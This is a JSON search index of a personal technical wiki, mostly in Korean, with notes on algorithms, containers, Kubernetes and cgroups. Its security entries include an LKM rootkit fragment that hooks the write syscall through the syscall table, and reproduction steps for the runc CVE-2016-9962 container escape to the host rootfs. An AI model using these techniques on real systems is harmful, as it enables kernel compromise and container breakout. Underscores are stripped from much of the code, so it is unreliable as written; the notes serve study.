[
    {
        "uri": "/content/algorithm/algorithm_pattern",
        "title": "algorithm pattern",
        "content": "\nIntro\nBacktracking\nDynamic Programing\nDivide and Conquer\nGreedy Method\n",
        "tags": []
    },
    {
        "uri": "/content/algorithm/computational_geometry",
        "title": "computational geometry",
        "content": "\nIntro\nClosest Pair\n  Line Sweeping\nFarthest Pair\n  CCW\n  Graham Scan Method\n  Rotatin Calipers\n",
        "tags": []
    },
    {
        "uri": "/content/algorithm/datastructure",
        "title": "datastructure",
        "content": "\nIntro\nStack, Queue, Deque\nPriority Queue, Heap\nBinary Tree\nSegment Tree\nFenwik Tree\nTRIE\nUnion Find\nBalanced Tree\n  B, B+, B*\n  Red Black\n  AVL\n  Splay\n  Treap\nGraph\n  Adjacency Array\n  Adjacency List\n  Edge List\n",
        "tags": []
    },
    {
        "uri": "/content/algorithm/etc",
        "title": "etc",
        "content": "\nIntro\n Maximum Sum Sub Array\nKadane's Algorithm\n",
        "tags": []
    },
    {
        "uri": "/content/algorithm/graph",
        "title": "graph",
        "content": "\nIntro\nTopological Sort\n\n Minmum Spanning Tree\n  Prim\n  Kruskal\n\nGraph Traversal\nDepth First Search\nBreadth First Search\nBest Firset Search\nHamiltionian Path\nEulerian Path\n\n Shortest Path\nFloyd-Warshal\nDijkstra\nBellman-Ford\n",
        "tags": []
    },
    {
        "uri": "/content/algorithm/index",
        "title": "Algorithm",
        "content": "\nAlgorithm\nDatastructure; Algorithm Pattern; Mathematics; 주요 Algorithm; 관련 문제 및 풀이 정리.\n\n Contentes\nMathematics\nDatastructure\nAlgorithm Pattern\nSorting\nTree\nGraph\nNetwork\nComputational Geometry\nString Matching\nETC\n",
        "tags": []
    },
    {
        "uri": "/content/algorithm/mathematics",
        "title": "mathematics",
        "content": "\nIntro\nModulor\nPrime Number\n  Sieve of Eratosthenes\nPrime Factorization\nGreatest Common Divisor\n  Euclid's Algorithm\nLeast Common Multiplier\nBase Conversion\nFactorial\nCombination\nPermutation\n",
        "tags": []
    },
    {
        "uri": "/content/algorithm/network",
        "title": "network",
        "content": "\nIntro\nFord Fulkerson\nBipartite Matching\nMCMF\nHungarian Method\n",
        "tags": []
    },
    {
        "uri": "/content/algorithm/sorting",
        "title": "sorting",
        "content": "\nIntro\nSelection\nBubble\nMerge\nQuick\nHeap\n",
        "tags": []
    },
    {
        "uri": "/content/algorithm/string_matching",
        "title": "string matching",
        "content": "\nIntro\nKnuth-Moriss-Pratt\nAho-Corasick\n",
        "tags": []
    },
    {
        "uri": "/content/algorithm/tree",
        "title": "tree",
        "content": "\nIntro\n Tree Traversal\nExhaustive\nBranch and Bound\n\nTree Search\nIn/Pre/Post Order\nBinary/Ternary\n\n Least Common Ancestor\nRange Minimum Query\n",
        "tags": []
    },
    {
        "uri": "/content/architecture/index",
        "title": "Architecture",
        "content": "\nArchitecture\nCloud, Container, Serverless 등 Architecture 관련 내용 정리.\n\n Contents\nServerless\n",
        "tags": []
    },
    {
        "uri": "/content/architecture/serverless",
        "title": "serverless",
        "content": "\nIntro\nFAAS, Function as a Service\n\n Service Provider\nlambda by AWS\niron.io\nopenwhisk by IBM Bluemix\nwebtask.io\nnstack formerly stackhut\n\nFramework\nServerless by AWS\nApex\nCloudiaJS\n\n Openrsource\nKubernetes\nfunktion by Fabric\nfission by Platform9\nkubeless\n\n Reference\nhttps://martinfowler.com/articles/serverless.html\n",
        "tags": []
    },
    {
        "uri": "/content/cloud/index",
        "title": "Cloud",
        "content": "\nCloud\nCloud Service 관련 내용 정리.\n\n Contents\nAWS\nGCP\nOpenStack\n",
        "tags": []
    },
    {
        "uri": "/content/container/index",
        "title": "Container",
        "content": "\nContainer\nContainer 관련 표준; Orechstration 도구 운용; 자동화 관련 내용 정리.\n\nContainer Engine : docker, rkt 등\nOrchestration Tool : kuberentes, swarm 등\nETC : Ansible, Consul, Terraform, Vault, Dex 등 container managing에 활용되는 기술\n\n Contents\nkubernetes in production\n\nPerformance Analysis\nhttps://www.slideshare.net/brendangregg/container-performance-analysis\n",
        "tags": []
    },
    {
        "uri": "/content/container/inside",
        "title": "inside",
        "content": "\nLinux Features\nnamespace\ncgroups\nchroot\npivot_root\nunion mount\nbind mount\niptables\nveth\ncapabilities\nseccomp\nLSM\n  SELinux\n  AppArmor\n\nLinux에서 Container를 구성하는 주요 Kerenl Feature는 위와 같다.\n\n Simple Container\n아래와 같이 간단한 container를 만들어 볼 수 있다.\n유사한 project로 bocker가 있다.\ndefine GNUSOURCE\ninclude sys/types.h\ninclude sys/wait.h\ninclude sys/mount.h\ninclude stdio.h\ninclude stdlib.h\ninclude sched.h\ninclude signal.h\ninclude unistd.h\n\ndefine ChkErr(expr) if(expr!=0) { line=LINE; ret=expr; goto ErrorExit; }\ndefine STACK_SIZE (1024 * 1024)\n\nstatic char childstack[STACKSIZE];\nchar* const child_args[] = {\n  \"/bin/sh\",\n  NULL\n};\n\nint checkpoint[2];\nint ret;\nint line;\n\nvoid setmap(char* file, int insideid, int outside_id, int len)\n{\n  FILE* mapfd = fopen(file, \"w\");\n  if(NULL==mapfd) {\n    perror(\"open file error\");\n    return;\n  }\n  fprintf(mapfd, \"%d %d %d\", insideid, outsideid, len);\n  fclose(mapfd);\n}\n\nvoid setuidmap(pidt pid, int insideid, int outside_id, int len)\n{\n  char file[256];\n  sprintf(file, \"/proc/%d/uid_map\", pid);\n  setmap(file, insideid, outside_id, len);\n}\n\nvoid setgidmap(pidt pid, int insideid, int outside_id, int len)\n{\n  char file[256];\n  sprintf(file, \"/proc/%d/gid_map\", pid);\n  setmap(file, insideid, outside_id, len);\n}\n\nint child_main(void* arg)\n{\n  char c;\n\n  close(checkpoint[1]);\n\n  printf(\" - World !\\n\");\n  sethostname(\"In Namespace\", 12);\n\n  read(checkpoint[0], &c, 1);\n\n  chroot(\"/home/keyolk/study/container/root\");\n  chdir(\"/\");\n  setenv(\"PATH\", \"/bin\", 1);\n\n  mount(\"proc\", \"/proc\", \"proc\", 0, NULL);\n  system(\"ip link set veth1 up\");\n  system(\"ip addr add 169.254.1.2/30 dev veth1\");\n\n  execv(childargs[0], childargs);\n\n  printf(\"Ooops!\\n\");\n  return 1;\n}\n\nint main()\n{\n  char* cmd;\n  const int gid=getgid(), uid=getuid();\n  pipe(checkpoint);\n\n  printf(\"Parent: eUID = %ld;  eGID = %ld, UID=%ld, GID=%ld\\n\",\n      (long) geteuid(),\n      (long) getegid(),\n      (long) getuid(),\n      (long) getgid());\n\n  printf(\" - [%d] Hello ?\\n\", getpid());\n\n  int childpid = clone(childmain, childstack+STACKSIZE,\n      CLONE_NEWUTS |\n      CLONE_NEWIPC |\n      CLONE_NEWPID |\n      CLONE_NEWNS  |\n      CLONE_NEWNET |\n      SIGCHLD, NULL);\n\n  if (child_pid == -1) {\n    printf(\"Failed to clone process\\n\");\n    return 1;\n  }\n\n  printf(\"Parent %d, Container %d\\n\", getpid(), child_pid);\n\n  setuidmap(child_pid, 0, 1000, 1);\n  setgidmap(child_pid, 0, 1000, 1);\n\n  system(\"ip link add veth0 type veth peer name veth1\");\n  asprintf(&cmd, \"ip link set veth1 netns %d\", child_pid);\n  system(cmd);\n  system(\"ip link set veth0 up\");\n  system(\"ip addr add 169.254.1.1/30 dev veth0\");\n  free(cmd);\n\n  close(checkpoint[1]);\n  waitpid(child_pid, NULL, 0);\n  system(\"ip link delete veth0\");\n  printf(\"Parent: Container stopped!\\n\");\n\n  return 0;\n}\n",
        "tags": []
    },
    {
        "uri": "/content/container/kubernetes",
        "title": "kubernetes",
        "content": "\nIntro\nProduction 환경에서,\nKubernetes를 어떻게 배포/구성할지에 대해 정리.\n\n아래 사항에 대해서 Best Practice 찾아 기술.\n\ndeploy\navailability\nsecurity\nperformance\n\n Deployment\nMulti Cloud 환경과 같이 infra 제공자가 다양한 경우\n반복적으로 Cluster를 배포하게된다.\n\nProcess에 따라 Kubernetes의 Cluster Federation도 활용될 수 있으며\n이를 고려한 배포가 이뤄져야 한다.\n\n전반적인 배포 제어는 Ansible과 같은 도구를 활용하여 자동화한다.\n\nMulti Cloud\nCluster를 배포할때,\nMulti Cloud를 통한 Affinity를 고려하자면 Hashicorp의 Terraform과 같은\n추상화된 Cloud Management Tool을 사용하는게 좋다.\n\ninstance가 확보되고 나면 cloud-config를 같은 도구를 활용하여\n일관성 있게 각 instance를 초기화하도록 한다.\n\n Self Hosting\nSelf Hosted Cluster를 구성하면 배포 이후 Cluster의 변경사항을 관리하는데 용이하다.\nkubelet은 독립적으로 Pod을 hosting 할 수 있으므로 이를 이용해\napiserver, control manager, proxy를 구동하도록 한다.\n\nbinary는 hyperkube 같은 묶음을 활용하면 일관성있게 binary를 관리할 수 있다.\nhyperkube image에 대한 배포도 container image를 활용하되\nkubelet을 실행하는 container engine이 Resilency한지 따져봐야한다.\nDocker 경우 최근 version에서 이를 지원하며\n그외 CoreOS의 RKT나 LXC 등을 활용할 수 있다.\n\nNetwork\nSelf Hosted Cluster를 구성할땐 CNI network을 사용해야한다.\nCNI를 활용할 경우 kubelet은\ncluster의 KV storage에 직접 접근하여 network fabric을 구성한다.\n\nCNI option으론 Calico + Flannel 조합으로 VxLan을 많이 사용한다.\n아래의 Canal을 통해 쉽게 배포 할 수 있다.\n\nhttps://github.com/projectcalico/canal\n\nCanal은 새로운 Kubelet이 등록되면 DaemonSet으로 필요한 Network Fabric Asset을\n전달하도록 되어있다.\n\nNetwork에 대한 변경이 이뤄지면 일관적으로 전체 cluster node에 이를 전파할 수 있다.\n\n Endpoints\nkubelet에서 kube apiserver 및 KV storage에 일관적으로 접속이 가능해야한다.\n내부 load balancer를 구성하여 connection을 보장해 준다.\n\nMaster와 KV storage는 HA하게 구성한다.\n\nSecret\nKuberntes에서 Secret 관리와 관련된 내용을 정리한다.\n\nhttp://kubernetes.io/docs/user-guide/secrets/\n\nKubernetes에선 자체적으로 Secret System을 가지고 있으나\ndata는 KV stroage 내에서 암호화 되지 않은채로 존재한다.\n\n즉, etcd에 대한 접근 권한이 있으면\n모든 secret을 가져갈 수 있다.\n\netcd 자체적으로 제공하는 auth는 client certificates가 있고\n이에 대해서 ACL도 제공하므로 이를 이용하면 보다 secure하게 이를 관리할 수 있으나,\n근본적으로 data 유출에 대한 위험은 남아있게된다.\n\n앞서 보았듯 self hosting 하게 cluster를 구성하는경우 network를 CNI로 구성하게 되는데\nkubelet이 직접 KV storage에 접근하게 된다.\n\n Secret Encryption\n모든 kubelet node에서 etcd에 대해 접근 권한을 갖게되는것이므로 유의해야한다.\n\nsecret data를 암호화하기 위한 option으로 vault가 많이 고려된다.\n아직 kubernetes에서 secret에 대해 plugin 형태의 interface를 제고하고 있지 않아\n사용하기 용이한 implementation은 아직 없으나 kubernetes에 맞춘 vault controller를 제공하는\nproeject가 몇가지 존재한다.\n\n아래는 vault와 관련된 link이다.\n\nHashicorp Vault : https://github.com/hashicorp/vault\n  dicussions : https://github.com/kubernetes/kubernetes/issues/10439#issuecomment-263954184\n  generate PKI stufss for kubernetes components : https://www.digitalocean.com/company/blog/vault-and-kubernetes/\n  deploy vault in kubernetes : http://www.devoperandi.com/vault-in-kubernetes-take-2/\n  vault integration with kubernetes pod\n    https://github.com/Boostport/kubernetes-vault\n    https://github.com/kelseyhightower/vault-controller\n\nTLS Assets\n위의 Vault를 통해 Kubernetes Component 들이 사용하는 TLS Asset들을 관리할 수 있다.\nConsul + Vault + Consul Template 조합으로 pki backend를 사용한다.\n\n다만 이를 kubelet 하나로 Self Hosted 하게 구성하려고 할때,\n당장 편리해보이는 방법을 모르겠다.\n\napiserver를 구성하는 kubelet에 vault와 consul template을 같이 올리는 방법도 있을것 같으나\n좀더 고민이 필요하다.\n\n Auth\nKubernetes Auth와 관련,\n대략적인 내용과 link들을 정리한다.\n\nAuthentication : http://kubernetes.io/docs/admin/authentication/\n  Basic Auth\n  Client Certificates\n  Static Token\n  Webhook Token\n  KeyStone Password\n  Authenticating Proxy\n  OIDC Token :\n    Google OIDC\n    Auth0\n    CoreOS Dex :  https://github.com/coreos/dex\n      Google OIDC : https://github.com/coreos/dex/blob/master/Documentation/openid-connect.md\n      Github OAuth : https://github.com/coreos/dex/blob/master/Documentation/github-connector.md\n      LDAP : https://github.com/coreos/dex/blob/master/Documentation/ldap-connector.md\n    Redhat KeyCloak : http://www.devoperandi.com/kubernetes-authentication-openid-connect/\n    CloudFoundry UAA : https://apigee.com/about/tags/kubernetes\nAuthorization : http://kubernetes.io/docs/admin/authorization/\n  ABAC\n  RBAC : https://github.com/uruddarraju/kubernetes-rbac-policies\n  Webhook\n    bitesize-authz-webhook : https://github.com/pearsontechnology/bitesize-authz-webhook\n\nAuthN\nCoreOS Dex의 경우 JBoss의 Keyclak이나 CloudFoundry의 UAA에 비해서 전반적으로 구조가 단순하고 배포하기 용이하다.\n다른 Solution에 비해 덜성숙된 느낌을 같지만 사용함에 문제가 없었다.\n별도 Client를 구성 해야하는 번잡함이 있긴하다.\n\n AuthZ\nRBAC이 현재로는 apiserver의 재기동 없이 dynamic하게 policy를 적용할 수 있는 거의 유일한 option 이다.\nWebhook을 통해 외부 instance에서 처리하는 방법도 있으나\n별도로 자체 구축해야하며, 알려진 opensource 중에선 뚜렷이 눈에 띄는게 없었다.\n\nToDo\nLogin : kubectl의 경우 아직 login관련된 feature가 없다 Token을 kubeConfig에 따로 전달해주어야한다.\n별도 CLI wrapper를 사용할 수 있다.\n\nRBAC : User record가 생성될때 이에따라 필요한 RBAC policy를 생성할 controller가 필요하다.\n없을 시 수동으로 처리해줘야한다.\n",
        "tags": []
    },
    {
        "uri": "/content/container/network",
        "title": "network",
        "content": "\nContaienr Network Model\n참고하기 좋다.\n\nhttp://murat1985.github.io/kubernetes/cni/2016/05/14/netns-and-cni.html\nhttp://murat1985.github.io/kubernetes/cni/2016/05/15/bagpipe-gobgp.html\nhttp://murat1985.github.io/kubernetes/cni/2016/05/15/kubernetes.html\nhttp://murat1985.github.io/kubernetes/cni/consul/2016/05/26/cni-consul.html\nhttp://murat1985.github.io/kubernetes/cni/consul/2016/07/14/cni-consul-impl.html\n",
        "tags": []
    },
    {
        "uri": "/content/container/security",
        "title": "security",
        "content": "\nCompliance\nDocker 경우 아래와같이 CIS에서 정리한게 있다.\n\n1.6\n1.11\n1.12\n\n간단한 script를 docker에서 제공한다.\n\n Vulnerability\nTwistlock: https://twistlock.com/\nAqua: https://www.aquasec.com/\nNautilus: https://blog.docker.com/tag/nautilus/\nCoreOS Clair: https://github.com/coreos/clair\nOpenSCAP: https://github.com/OpenSCAP/container-compliance\nLynis: https://cisofy.com/lynis/plugins/docker-containers/\nVuls: https://github.com/future-architect/vuls/\n\nContent Trust\nDocker Notary: https://github.com/docker/notary\n\n Secret\nHashiCorp Vault\nSquare Keywhiz\n",
        "tags": []
    },
    {
        "uri": "/content/container/standard",
        "title": "standard",
        "content": "\nEngine\n OCI\nOpen Container Initiative\n\nhttps://www.opencontainers.org/\n\nAPPC\nApplication Container Basics\n\nhttps://github.com/appc/spec\n\n CNCF\nClound Native Computing Foundtaion\n\nhttps://www.cncf.io/\n\nCRI-O\nContainer Runtime Interface\n\naka OCID, Open Container Initiative Daemon\n\nhttps://github.com/kubernetes-incubator/cri-o\n\nhttp://thenewstack.io/cri-o-make-kubernetes-center-container-ecosystem/\n\n Network\nCNI\n\n libnetwork\n",
        "tags": []
    },
    {
        "uri": "/content/home",
        "title": "keyolk's page",
        "content": "\nAbout Me\nWorking History\n\n2017.06-       : Search System DevOps\n2017.01-2017.06: PaaS/MultiCloud R&D\n2015.07-2016.12: Cloud/Container Architecture R&D\n2013.01-2014.12: DRM/CAS Development\n2012.07-2012.12: Web Application Development\n\nCurrent Interests\n\nCloud Native.\nContainer Architecture.\nCI/CD.\nLogging.\nMonitoring.\nIdentity&Access Management.\n\n Links\nLinkedin\nGithub\n",
        "tags": []
    },
    {
        "uri": "/content/language/index",
        "title": "Language",
        "content": "\nLanguage\n언어 별 feature; 내부 동작; Design Pattern; Library 관련 내용 정리.\n\n Contents\nShellscript\nPython\nC/C++\nGo\nJava\n",
        "tags": []
    },
    {
        "uri": "/content/language/regular_expression",
        "title": "regular expression",
        "content": "\nType\nPosix Rerular Expression\n  BRE: Basic Regular Expression\n  ERE: Extened Regular Expression\nPCRE: Perl Compatible Regular Expression\n\n Posix Regular Expression\nIEE std 1003.1\n\n|           |        |                                      |\n|-----------|--------|--------------------------------------|\n| 문자지정 \t| .      | 임의의 문자 한개                     |\n| 반복 지정\t| ?      | 선행 문자 패턴이 0개 혹은 1개        |\n| \t\t\t\t  | +      | 선행 문자 패턴이 1개 이상 반복       |\n| \t\t\t\t  | *      | 선행 문자 패턴이 0개 이상 반복       |\n| \t\t\t\t  | {m, n} | 반복수 지정                          |\n| 위치지정  | ^      | 라인의 앞부분                        |\n|           | $      | 라인의 끝부분                        |\n| 그룹 지정 | [...]  | 그룹 중 한 문자                      |\n|           |  | 그룹 내 문자들을 제외한 나머지       |\n| 기타      | \\      | escape                               |\n|           | \\|     | OR                                   |\n|           | ()     | pattern group                        |\n",
        "tags": []
    },
    {
        "uri": "/content/language/shellscript",
        "title": "shellscript",
        "content": "\nParameter\n| variable           | Set and Not Null     | Set But Null    | Unset           |\n|--------------------|----------------------|-----------------|-----------------|\n| ${parameter:-word} | substitute parameter | substitute word | substitute word |\n| ${parameter-word}  | substitute parameter | substitute null | substitute word |\n| ${parameter:=word} | substitute parameter | assign word     | assign word     |\n| ${parameter=word}  | substitute parameter | substitute null | assign word     |\n| ${parameter:?word} | substitute parameter | error, exit     | error, exit     |\n| ${parameter?word}  | substitute parameter | substitute null | error, exit     |\n| ${parameter:+word} | substitute word      | substitute null | substitute null |\n\n Reference\nhttp://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3chap02.html#tag180602\n",
        "tags": []
    },
    {
        "uri": "/content/security/index",
        "title": "Security",
        "content": "\nSecurity\nRootkit 등 Malware 동작; Vulnerability와 그에 따른 Exploit; Certificates/Key 등 Secret Management 관련 내용 정리.\n\n Contents\nMalware\nExploit\nVulnerability\nSecrets\n",
        "tags": []
    },
    {
        "uri": "/content/security/openscap",
        "title": "openscap",
        "content": "\nSCAP: Security Content Automation Protocol\nXCCDF: Extensible Configuration Checklist Description Format\nOVAL: Open Vulnerability and Assessment Language\n",
        "tags": []
    },
    {
        "uri": "/content/security/rootkit",
        "title": "rootkit",
        "content": "\nLKM\nkernel내 syscall table에 등록된 syscall의 주소를 변조.\nkernel의 syscall 내부에 inline assembly로 구현된어있는 function들에 대한 offset을 변조.\n\nasmlinkage int newwrite (unsigned int x, const char _user *y, size_t size) {\n  printk(KERN_EMERG \"[+] write() hooked.\");\n\n  return original_write(x, y, size);\n}\n\nstatic int __init onload(void) {\n  char *kernelversion = kmalloc(MAXVERSIONLEN, GFPKERNEL);\n\n  printk(KERNEMERG \"Version: %s\\n\", acquirekernelversion(kernelversion));\n\n  findsyscalltable(acquirekernelversion(kernelversion));\n\n  printk(KERNEMERG \"Syscall table address: %p\\n\", syscalltable);\n  printk(KERN_EMERG \"sizeof(unsigned long ): %zx\\n\", sizeof(unsigned long));\n  printk(KERNEMERG \"sizeof(syscalltable) : %zx\\n\", sizeof(syscalltable));\n\n  if (syscall_table != NULL) {\n      writecr0 (readcr0 () & (~ 0x10000));\n      originalwrite = (void *)syscalltable[_NRwrite];\n      syscalltable[NRwrite] = &new_write;\n      writecr0 (readcr0 () | 0x10000);\n      printk(KERNEMERG \"[+] onload: syscall_table hooked\\n\");\n  } else {\n      printk(KERNEMERG \"[-] onload: syscalltable is NULL\\n\");\n  }\n\n  kfree(kernel_version);\n\n  return 0;\n}\n",
        "tags": []
    },
    {
        "uri": "/content/security/vulnerability",
        "title": "vulnerability",
        "content": "\nTaxonomy of Linux Kernel Vulnerability Solutions\n Input Validation Error\nBuffer Overflow\nBoundary Condition Error\nAccess Validation Error\nExceptional Condition Handling Error\nEnvironmental Error\nConfiguration Error\nDesign Error\nNonstandard\n\nRemedial Classification\nChange of Data Types\nPrecondition Validation\nEnsuring Atomicity\nError Handling\nZeroing Memory\nFreeing Resources\nInput Validation\nCapability Validation\nFail-Safe\nProtection Domain Enforcement\nRedesign\nOther\n\n Exploit\nNull Dereferencing\nvm.mmapminaddr\n\n Stack Overflow\n\nHeap Overflow\n\n Heap Spray\n\nCVE-2016-9962\nreproduction step described at here\n\n$ cd $GOPATH/src/github.com\n$ git clone https://github.com/opencontainers/runc opencontainers/runc\n$ git fetch origin 2cc5a91249ab3b362f1235da955d112017979d34\n$ git checkout origin 2cc5a91249ab3b362f1235da955d112017979d34\n$ vi $GOPATH/src/github.com/opencontainers/runc/libcontainer/setnsinitlinux.go\n\n아래 2개 line을 수정한다.\npackage libcontainer\n\nimport (\n  \"fmt\"\n  \"os\"\n\n  \"github.com/opencontainers/runc/libcontainer/apparmor\"\n  \"github.com/opencontainers/runc/libcontainer/keys\"\n  \"github.com/opencontainers/runc/libcontainer/label\"\n  \"github.com/opencontainers/runc/libcontainer/seccomp\"\n  \"github.com/opencontainers/runc/libcontainer/system\"\n\"time\"\n)\n  if err := label.SetProcessLabel(l.config.ProcessLabel); err != nil {\n    return err\n  }\n\ntime.Sleep(500 * time.Second)\n  return system.Execv(l.config.Args[0], l.config.Args[0:], os.Environ())\n}\ncontainer를 생성한다.\nsh1$ docker pull alpine\nsh1$ docker create --name alpine alpine\nsh1$ mkdir rootfs\nsh1$ docker export alpine | tar xvfC - rootfs/\nsh1$ runc spec\nsh1$ runc run ctr\nterminal을 새로 열고 container 내부에 process를 생성한다.\nsh2$ runc exec ctr sh\n여기서 500 초가량 block된다.\n다시 첫번째 terimnal로 돌아간다.\nsh1$ ps aux\nsh1$ ls /proc/18/fd -la\nsh1$ ls -la /proc/18/fd/4/../../..\n위와 같은 방식으로 Host의 rootfs에 접근이 가능하다.\n",
        "tags": []
    },
    {
        "uri": "/content/system/cgroup",
        "title": "cgroup",
        "content": "\nProcess group별 Management를 제공하는 I/F이다.\n\nCgroup자체는 Process Grouping만을 수행하며, \\\nResource에 대한 관리는 Subsystem을 통해 이뤄진다. \\\nCgroup으로 만들어진 Process Group은 hierachy하게 만들어질 수 있다. \n\n결과적으로 Cgroup을 통해 다음과 같은 기능을 제공한다.\n\nlimiting : Group에 대한 resoure 사용 제한. \\\nprioritization : CPU 및 disk I/O 자원에 대한 우선순위 부여. \\\naccounting : System에서 사용하는 resource 측정. \\\ncontrol : Group별 contol 제공. \n\nsysfs나 procfs와 같이 low-level filesystem interface로 구현되며, \\\n모든 cgroups 관련 action은 filesystem을 통해서 이뤄진다.\n\ncreate/remove directory, read/write file, mount/umount\n\ncgroup inode_operation : cgroup mkidr/rmdir\ncgroup filesystemtype : cgroup mount/umount\ncgroup file_operation : read/write to control file\n\n| subsystem       | version |\n|-----------------|---------|\n| cgroups         | 2.6.24  |\n| net_prio        | 3.3     |\n| net_cls         | 3.3     |\n| blkio async I/O | 3.10    |\n\nUser View\n\n일반적으로 /sys/fs/cgroups에 cgroupfs가 mount된다. \n여기서 생성되는 모든 entry는 reboot될때 지워진다. → persistent 하지 않다.\n\n$ ls -l /sys/fs/cgroups\ntotal 0\ndr-xr-xr-x 2 root root  0 Jan  1  1970 bfqio\ndr-xr-xr-x 4 root root  0 Jan  1  1970 blkio\nlrwxrwxrwx 1 root root 11 Jan  1  1970 cpu - cpu,cpuacct\ndr-xr-xr-x 4 root root  0 Jan  1  1970 cpu,cpuacct\nlrwxrwxrwx 1 root root 11 Jan  1  1970 cpuacct - cpu,cpuacct\ndr-xr-xr-x 3 root root  0 Jan  1  1970 cpuset\ndr-xr-xr-x 4 root root  0 Jan  1  1970 devices\ndr-xr-xr-x 3 root root  0 Jan  1  1970 freezer\nlrwxrwxrwx 1 root root 16 Jan  1  1970 netcls - netcls,net_prio\ndr-xr-xr-x 2 root root  0 Jan  1  1970 netcls,netprio\nlrwxrwxrwx 1 root root 16 Jan  1  1970 netprio - netcls,net_prio\ndr-xr-xr-x 2 root root  0 Jan  1  1970 perf_event\ndr-xr-xr-x 4 root root  0 Jan  1  1970 systemd`\n\n전체 cgroup에 대한 요약정보를 /proc에서 얻을 수 있다.\n\n$ cat /proc/cgruops\nsubsysname    hierarchy       numcgroups     enabled\ncpuset  7       3       1\ncpu     4       41      1\ncpuacct 4       41      1\nblkio   5       41      1\nmemory  0       1       0\ndevices 3       41      1\nfreezer 9       3       1\nnet_cls 2       1       1\nbfqio   8       1       1\nperf_event      6       1       1\nnet_prio        2       1       1\n\n현재 process와 관련, mount된 cgroup을 다음과 같이 알 수 있다.\n\n$  cat /proc/self/cgroup\n9:devices:/user.slice/user-0.slice/session-c3.scope\n8:netcls,netprio:/\n7:perf_event:/\n6:cpuset:/\n5:freezer:/\n4:bfqio:/\n3:blkio:/user.slice/user-0.slice/session-c3.scope\n2:cpu,cpuacct:/user.slice/user-0.slice/session-c3.scope\n1:name=systemd:/user.slice/user-0.slice/session-c3.scope\n[root@pi boot]# cat /proc/$$/cgroup\n9:devices:/user.slice/user-0.slice/session-c3.scope\n8:netcls,netprio:/\n7:perf_event:/\n6:cpuset:/\n5:freezer:/\n4:bfqio:/\n3:blkio:/user.slice/user-0.slice/session-c3.scope\n2:cpu,cpuacct:/user.slice/user-0.slice/session-c3.scope\n1:name=systemd:/user.slice/user-0.slice/session-c3.scope\n\ncgroup tree에 관해선 아래와 같은 rule이 적용된다. \n\nKernel View\n\nkernel 내 아래 path에 cgroup 관련 hook이 들어가 있다.\n\nin boot phase\n  start_kernel() : http://lxr.free-electrons.com/source/init/main.c?v=4.0L489\n  cgroupinitearly() : http://lxr.free-electrons.com/source/init/main.c?v=4.0#L508\n  cgroupinitearly() : http://lxr.free-electrons.com/source/include/linux/cgroup.h#L32\n  cgroupinitearly() : http://lxr.free-electrons.com/source/kernel/cgroup.c?v=4.0#L4953\n  cgroup_init() : http://lxr.free-electrons.com/source/init/main.c?v=4.0#L657\n  cgroup_init() : http://lxr.free-electrons.com/source/include/linux/cgroup.h#L33\n  cgroup_init() : http://lxr.free-electrons.com/source/kernel/cgroup.c?v=4.0#L4987\nin process creation/destory method, fork() & exit()\n  copy_procyss() : http://lxr.free-electrons.com/source/kernel/fork.c?v=4.0#L1190\n  cgroup_fork() : http://lxr.free-electrons.com/source/kernel/fork.c?v=4.0#L1324\n  cgroup_fork() : http://lxr.free-electrons.com/source/include/linux/cgroup.h?v=4.0#L34\n  cgroup_fork() : http://lxr.free-electrons.com/source/kernel/cgroup.c?v=4.0#L5182\n  cgrouppostfork() : http://lxr.free-electrons.com/source/kernel/fork.c?v=4.0#L1549\n  cgrouppostfork() : http://lxr.free-electrons.com/source/include/linux/cgroup.h?v=4.0#L35\n  cgrouppostfork() : http://lxr.free-electrons.com/source/kernel/cgroup.c?v=4.0#L5198\nnew file system type “cgroup” (VFS)\n  /sys/fs/cgroup : system에서 사용하는 cgroup mount point\nprocess descriptor additions (struct task_struct)\nprocfs entries :\n  /proc/pid/cgroup\n  /proc/cgroups\n\ntask_struct내에서 관련 filed를 찾을 수 있다. \\\nstruct task_struct : http://lxr.free-electrons.com/source/include/linux/sched.h?v=4.0#L1278 \\\nstruct cssset _rcu *cgroups : http://lxr.free-electrons.com/source/include/linux/sched.h?v=4.0#L1570 \\\nstruct css_set : http://lxr.free-electrons.com/source/include/linux/cgroup.h?v=4.0#L325 \\\n\n아래에서 list가 link된다. \\\nstruct list_head task : http://lxr.free-electrons.com/source/include/linux/cgroup.h?v=4.0#L343 \\\n지원하는 subsystem에 대해 기술되어 있다. \\\ncgroupsubsys.h : http://lxr.free-electrons.com/source/include/linux/cgroupsubsys.h?v=4.0 \\\n\nSubsystem\n\nGroup별로 Subsystem을 통해 Group을 제어 할 수 있다. \\\n상위 Group의 Subsystem 정책은 하위로 상속된다. \\\n\n4.1 기준으로 현재 11개의 subsystem을 지원해주고 있다. \\\n\ncpuset_subsys\n  개별 cpu와 memory node를 task에 할당한다.\n  struct cgroupsubsys cpusetcgrp_subsys :\n  http://lxr.free-electrons.com/source/kernel/cpuset.c?v=4.0L2036\nfreezer_subsys\n  task를 suspend하거나 resume 한다.\n  struct cgroupsubsys freezercgrp_subsys :\n  http://lxr.free-electrons.com/source/kernel/cgroup_freezer.c?v=4.0#L476\nmemcgroupsubsys\n  task의 memory 사용을 제한하고 task의 memory 사용량을 report 한다.\n  struct cgroup_subsys :\n  http://lxr.free-electrons.com/source/mm/memcontrol.c?v=4.0#L5381\nblkio_subsys\n  block device의 input/output을 제한한다.\n  struct cgroupsubsys blkiocgrp_subsys :\n  http://lxr.free-electrons.com/source/block/blk-cgroup.c?v=4.0#L924\nnetpriosubsys\n  network interface 별로 priority를 동적으로 설정해준다.\n  struct cgroupsubsys netpriocgrpsubsys :\n  http://lxr.free-electrons.com/source/net/core/netprio_cgroup.c?v=4.0#L247\n  module로 사용 가능.\ndevices_subsys\n  task의 device access를 제한한다.\n  struct cgroupsubsys devicescgrp_subsys :\n  http://lxr.free-electrons.com/source/security/device_cgroup.c?v=4.0#L794\nperf_subsys\n  struct cgroupsubsys perfeventcgrpsubsys :\n  http://lxr.free-electrons.com/source/kernel/events/core.c?v=4.0#L8629\nhugetlb_subsys\n  struct cgroupsubsys hugetlbcgrp_subsys :\n  http://lxr.free-electrons.com/source/mm/hugetlb_cgroup.c?v=4.0#L418\ncpucgrpsubsys\n  struct cgroupsubsys cpucgrp_subsys :\n  http://lxr.free-electrons.com/source/kernel/sched/core.c?v=4.0#L8363\ncpuacct_subsys\n  struct cgroupsubsys cpuacctcgrp_subsys :\n  http://lxr.free-electrons.com/source/kernel/sched/cpuacct.c?v=4.0#L278\nnetclssubsys\n  module로 사용 가능.\n\n위는 다시 아래와 같이 구분해볼 수 